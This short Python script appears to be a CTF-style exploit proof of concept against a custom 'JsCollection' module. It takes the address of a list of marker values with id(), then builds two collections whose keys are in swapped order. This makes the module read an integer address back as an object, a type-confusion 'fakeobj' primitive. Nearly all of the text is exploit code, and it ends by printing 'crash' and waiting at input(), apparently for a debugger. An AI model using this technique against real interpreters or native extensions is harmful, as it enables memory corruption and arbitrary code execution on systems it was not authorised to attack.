import JsCollection

target = [0x42424242,0x42424242,0x42424242,0x42424242,0x42424242]

addr = id(target) + 8



a = JsCollection.JsCollection({"a":1337, "b":[1.2]})
b = JsCollection.JsCollection({"b":[1.3], "a":addr})
fakeobj = b.get("b")

print("crash")
input()
